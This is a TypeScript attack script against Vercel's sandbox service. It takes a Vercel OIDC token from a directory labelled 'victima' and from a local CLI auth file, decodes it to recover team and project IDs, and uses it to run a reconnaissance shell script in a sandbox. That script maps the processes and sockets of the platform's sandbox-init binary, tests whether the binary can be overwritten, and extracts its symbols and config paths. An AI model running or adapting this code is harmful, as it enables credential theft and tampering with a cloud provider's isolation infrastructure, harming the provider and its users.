import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const s = await Sandbox.get({ name: "recon-1787251919562", token: VICTIM, teamId, projectId });
  const SCRIPT = `
set +e
echo "===== PID1 + process tree ====="
ps -eo pid,ppid,user,cmd 2>/dev/null | grep -vE '^\s*PID' | head -25
echo "===== sandbox-init open sockets / fds ====="
PID=$(pgrep -f sandbox-init | head -1)
echo "sandbox-init PID=$PID"
ls -la /proc/$PID/fd/ 2>/dev/null | head -30
echo "===== net connections of sandbox-init ====="
cat /proc/$PID/net/tcp 2>/dev/null | head -5
cat /proc/$PID/net/tcp6 2>/dev/null | head -5
echo "===== real write test to sandbox-init ====="
cp /run/vercel/share/sandbox-init /tmp/sbi_backup 2>&1
if echo -n 'X' >> /run/vercel/share/sandbox-init 2>&1; then echo "REAL WRITE OK (appended)"; else echo "real write blocked"; fi
ls -la /run/vercel/share/sandbox-init
echo "===== restore from backup ====="
cp /tmp/sbi_backup /run/vercel/share/sandbox-init 2>&1 && echo "restored"
echo "===== go version in binary ====="
go version /run/vercel/share/sandbox-init 2>&1 | head -1 || strings -a /run/vercel/share/sandbox-init | grep -iE 'go1\.|Goroot|go version' | head -5
echo "===== exported main symbols ====="
nm -D /run/vercel/share/sandbox-init 2>/dev/null | grep -iE ' main\.| internal\.' | head -30 || echo "no nm -D"
echo "===== strings: http endpoints / config paths ====="
strings -a /tmp/sbi_backup 2>/dev/null | grep -oE '(/[a-zA-Z0-9_./-]{3,60})' | grep -iE 'api|sandbox|vercel|config|session|interactive|socket|pubkey|/opt|/run|/mnt|snapshot' | sort -u | head -40
echo "===== DONE ====="
`;
  const r = await s.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 40_000 });
  console.log(await r.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });